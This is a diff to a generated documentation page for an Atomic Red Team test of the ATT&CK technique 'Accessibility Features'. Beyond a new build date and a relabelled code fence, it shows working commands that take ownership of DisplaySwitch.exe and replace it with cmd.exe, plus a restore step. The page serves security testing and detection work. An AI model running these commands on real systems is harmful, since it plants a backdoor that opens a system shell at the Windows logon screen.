@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.008"
 attack_technique_name: "Event Triggered Execution: Accessibility Features"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "825ba8ca-71cc-436b-b1dd-ea0d5e109086"
@@ -44,7 +44,7 @@ Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows th
 
 ### Command
 
-```commandprompt
+```cmd
 IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
 takeown /F C:\Windows\System32\DisplaySwitch.exe /A
 icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
@@ -53,7 +53,7 @@ copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
 
 ### Cleanup
 
-```commandprompt
+```cmd
 copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
 ```
 
